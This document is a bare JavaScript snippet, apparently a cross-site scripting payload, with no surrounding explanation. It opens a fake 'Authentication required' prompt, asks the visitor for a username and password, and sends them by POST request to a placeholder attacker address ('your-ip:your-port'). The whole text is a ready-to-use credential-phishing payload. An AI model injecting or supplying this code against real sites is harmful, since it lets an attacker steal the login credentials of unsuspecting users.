(function() {
  var creds = prompt("Authentication required. Please enter your credentials in the format username:password:");
  if (creds) {
    var [username, password] = creds.split(':');
    fetch('http://your-ip:your-port/credentials', { 
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ username: username, password: password })
    });
  }
})();
